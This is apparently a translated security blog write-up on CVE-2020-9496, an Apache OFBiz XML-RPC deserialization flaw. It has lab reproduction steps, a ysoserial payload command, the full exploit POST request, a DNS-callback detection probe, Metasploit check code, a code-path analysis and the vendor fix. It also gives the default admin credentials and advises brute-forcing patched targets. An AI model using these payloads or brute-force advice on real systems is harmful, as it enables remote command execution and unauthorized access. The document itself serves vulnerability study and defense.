---
title: "[CVE-2020-9496] Apache OfBiz Deserialization Command Execution Vulnerability"
slug: exyfzi
translationKey: exyfzi
date: 2021-05-25T15:02:21+08:00
source: yuque/penetration
---

# 0x01    Background
> Apache OFBiz is a very well-known e-commerce platform and a very famous open-source project. It provides a framework based on the latest J2EE/XML specifications and technology standards for building large- and medium-sized enterprise-grade, cross-platform, cross-database, cross-application-server, multi-tier, distributed e-commerce WEB application systems. OFBiz's most notable characteristic is that it provides a complete set of components and tools for developing Java-based web applications, including the entity engine, service engine, message engine, workflow engine, rules engine, and more. By default you can log in with the username `admin` and the password `ofbiz`.
>
> <font style="color:rgb(51, 51, 51);">Around 2020-09-29,</font> a deserialization vulnerability was found in the XMLRPC interface of versions prior to 17.12.04. An attacker can exploit this vulnerability to execute arbitrary commands on the target server.
>

An e-commerce platform that is rarely used in China — a basic deserialization vulnerability.

## (1) Affected versions
Apache OFBiz versions < 17.12.04

---

# 0x02    Vulnerability Reproduction
## (1) Accessing the environment
Requesting `/webtools/control/xmlrpc` returns `Failed to read XML-RPC request. Please check logs for more information`, as shown in the figure

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1621928614836-d59a8945-e6a9-4261-b5e2-f1cc74d9d9cd.png)

Notes:

1. You must access `/webtools` (a single slash); accessing `//webtools` redirects to `/webtools/control/main`, and you cannot confirm whether the xmlrpc API is exposed.
2. When reproducing on the vulhub environment, there is no need to set `Content-Type` to `application/www-form-urlencoded`; I used `application/www-form-urlencoded` and the vulnerability could still be triggered. Still — it is recommended to set it to `xml`



Once the current environment is confirmed reachable, start generating the payload.

## (2) Generating the payload
![](https://cdn.nlark.com/yuque/0/2021/png/166008/1621928086402-1bf8d51c-46a1-4af9-86a5-d2942edd1503.png)

Use YSoSerial to encode the command to be executed

```basic
java -jar ysoserial.jar CommonsBeanutils1 "touch /tmp/success" | base64 | tr -d "\n"
```

This generates the content shown in the figure below

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1621929039888-5644fcb8-b62d-4018-af17-69395f0d1b62.png)

(When testing on the vulhub environment, I found it works even without using `tr` to strip the newlines — pure black magic...)

## (3) EXP
Construct the following request, replacing `[base64-payload]` with the base64 string just generated

```basic
POST /webtools/control/xmlrpc HTTP/1.1
Host: your-ip
Content-Type: application/xml
Content-Length: 4093

<?xml version="1.0"?>
<methodCall>
  <methodName>ProjectDiscovery</methodName>
  <params>
    <param>
      <value>
        <struct>
          <member>
            <name>test</name>
            <value>
              <serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">[base64-payload]</serializable>
            </value>
          </member>
        </struct>
      </value>
    </param>
  </params>
</methodCall>

```

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1621927994591-64f60141-621c-4fc5-94a3-4fdc810ba73d.png)<font style="color:#BFBFBF;">The image above is from</font>[<font style="color:#BFBFBF;">github-vulhub</font>](https://github.com/vulhub/vulhub/blob/master/ofbiz/CVE-2020-9496/README.zh-cn.md)

After sending it, command execution is achieved

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1621928051091-48fe17fb-fb68-4cb3-8c8a-244b12ce1917.png)

## (4) Non-destructive PoC
It is recommended to use URLDNS to non-destructively verify whether the deserialization vulnerability exists.

First, generate the payload in YSO with the domain you want it to request, for example

```basic
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS "http://ofbiz.xxxx.ceye.io" |base64 |tr -d "\n"                                                                              
```

Then send the request along with the payload

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1621930411547-68011a59-101d-4e59-a7bd-d9be06545fc6.png)

If a request arrives on the dnslog platform, the vulnerability is confirmed!

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1621930320059-79bbdd5b-68a6-44a0-a657-cd7667af50c5.png)

I also took a look at [MSF's detection method](https://packetstormsecurity.com/files/158887/Apache-OFBiz-XML-RPC-Java-Deserialization.html)

```ruby
def check
    # Send an empty serialized object
    res = send_request_xmlrpc('')

    unless res
      return CheckCode::Unknown('Target did not respond to check.')
    end

    if res.body.include?('Failed to read result object: null')
      return CheckCode::Vulnerable('Target can deserialize arbitrary data.')
    end

    CheckCode::Safe('Target cannot deserialize arbitrary data.')
  end
```

It simply empties `[base64-payload]` and POSTs it over; if the response contains `Failed to read result object: null`, the vulnerability is proven. (There are a few small details: for example, `<methodName>` must be in the form of random letters + digits.

```ruby
<?xml version="1.0"?>
        <methodCall>
          <methodName>#{rand_text_alphanumeric(8..42)}</methodName>
          <params>
            <param>
              <value>
                <struct>
                  <member>
                  <name>#{rand_text_alphanumeric(8..42)}</name>
                    <value>
                      <serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">#{Rex::Text.encode_base64(data)}</serializable>
                    </value>
                  </member>
                </struct>
              </value>
            </param>
          </params>
        </methodCall>
```

---

# 0x03    Vulnerability Analysis
Just refer directly to 360Cert's article -> [https://cert.360.cn/report/detail?id=ba5eeaf8536ba73611dd4abd198c4eb9](https://cert.360.cn/report/detail?id=ba5eeaf8536ba73611dd4abd198c4eb9)

From my reading I mainly took away the following points:

## (1) What exactly is the XMLRPC interface for?
> XML-RPC allows software running on different operating systems, in different environments, to make procedure calls over the Internet.
>
> It is a remote procedure call that uses HTTP as the transport and XML as the encoding.
>
> ——[https://ws.apache.org/xmlrpc/index.html](https://ws.apache.org/xmlrpc/index.html)
>

Simply put, it is an XML implementation of <u>Remote Procedure Call</u> (<u>RPC</u>).

If you want to understand this kind of interface further, you can go to the [XML-RPC Debugger](http://scripting.com/code/xmlrpcdebugger/), which has a built-in page for constructing requests — quite convenient.

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1622087013526-2780b60b-e71e-4cbf-8c10-bf72b560f681.png)

In fact, WordPress also ships an XML-RPC service, but individual bloggers basically never use it; instead it is often abused for brute-forcing accounts and passwords, so it is recommended to disable it.

From this point of view, XML-RPC's benefits are mostly at the programming level; individual users rarely use it.



## (2) The main deserialization flow
<font style="color:rgb(51, 51, 51);">When parsing </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">serializable</font><font style="color:rgb(51, 51, 51);">, the </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">typeParser</font><font style="color:rgb(51, 51, 51);"> of </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">XmlRpcRequestParser</font><font style="color:rgb(51, 51, 51);"> is still </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">MapParser</font><font style="color:rgb(51, 51, 51);">, but </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">MapParser</font><font style="color:rgb(51, 51, 51);"> cannot handle the </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">serializable</font><font style="color:rgb(51, 51, 51);"> tag; at this point a new </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Parser</font><font style="color:rgb(51, 51, 51);"> must be obtained, and when the </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">serializable</font><font style="color:rgb(51, 51, 51);"> tag is parsed, </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">getParser</font><font style="color:rgb(51, 51, 51);"> returns </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">SerializableParser</font><font style="color:rgb(51, 51, 51);">.</font>

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1622101116126-bf9d54bb-221a-43b5-a24b-65fd290a729d.png)

<font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">SerializableParser</font><font style="color:rgb(51, 51, 51);"> extends </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">ByteArrayParser</font><font style="color:rgb(51, 51, 51);"> and has no </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">startElement</font><font style="color:rgb(51, 51, 51);"> method, so the parent class </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">ByteArrayParser</font><font style="color:rgb(51, 51, 51);"> is called, which sets the </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">OutputStream</font><font style="color:rgb(51, 51, 51);"> and decodes the input stream — you can see the base64 decoding happens right here</font>

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1622101154269-04191d5c-67dc-4b8c-8815-fef3ddda446a.png)

<font style="color:rgb(51, 51, 51);">Next, </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);"></serializable></font><font style="color:rgb(51, 51, 51);"> is handled in </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Serializable#endElement</font><font style="color:rgb(51, 51, 51);">, where </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">setResult</font><font style="color:rgb(51, 51, 51);"> assigns a value to </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">result</font><font style="color:rgb(51, 51, 51);">. This is effectively where the deserialized data is retrieved</font>

What follows is its wrapper class

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1622101259110-5a1a418c-2ce6-4fa4-89d0-b1f79b1cd9cf.png)

A classic `bais`->`ois`->`readObject()` three-stage deserialization.



---

# 0x04    Fix
The official fix simply added authentication in `web.xml`, [see it directly here](https://github.com/apache/ofbiz-framework/commit/4bdfb54ffb6e05215dd826ca2902c3e31420287a#diff-b31806fbf9690361ad449e8f263345d8)

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1622083134284-78a497ec-da8d-44e3-9e2a-e0daa5d024af.png)

The test cases also show that authentication was added. However, the username and password are actually passed in via GET — the security bar clearly isn't very high.

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1622083233945-550d8397-b8bb-4c3e-903a-fc0d6b501383.png)

---

# 0x05    Summary
+ `xmlrpc` itself supports deserializing serialized data; the problem is that `ofbiz` did not apply access control to the xmlrpc interface
+ But judging from the fix, they only added a layer of verification — it really treats the symptoms rather than the root cause
+ For targets that have been patched, it is recommended to go straight to brute-forcing; once the brute-force succeeds, you can deserialize



---

# Refs


+ [https://github.com/vulhub/vulhub/blob/master/ofbiz/CVE-2020-9496/README.zh-cn.md](https://github.com/vulhub/vulhub/blob/master/ofbiz/CVE-2020-9496/README.zh-cn.md)
+ [https://www.cnblogs.com/ph4nt0mer/p/13576739.html](https://www.cnblogs.com/ph4nt0mer/p/13576739.html)
+ [https://cert.360.cn/report/detail?id=ba5eeaf8536ba73611dd4abd198c4eb9](https://cert.360.cn/report/detail?id=ba5eeaf8536ba73611dd4abd198c4eb9)
+ [https://securitylab.github.com/advisories/GHSL-2020-069-apache_ofbiz/](https://securitylab.github.com/advisories/GHSL-2020-069-apache_ofbiz/)
+ [http://www.jackson-t.ca/runtime-exec-payloads.html](http://www.jackson-t.ca/runtime-exec-payloads.html)
+ [http://ceye.io/records/dns](http://ceye.io/records/dns)[  
  
  
  
  
  
  
  
  
  
](https://securitylab.github.com/advisories/GHSL-2020-069-apache_ofbiz/)
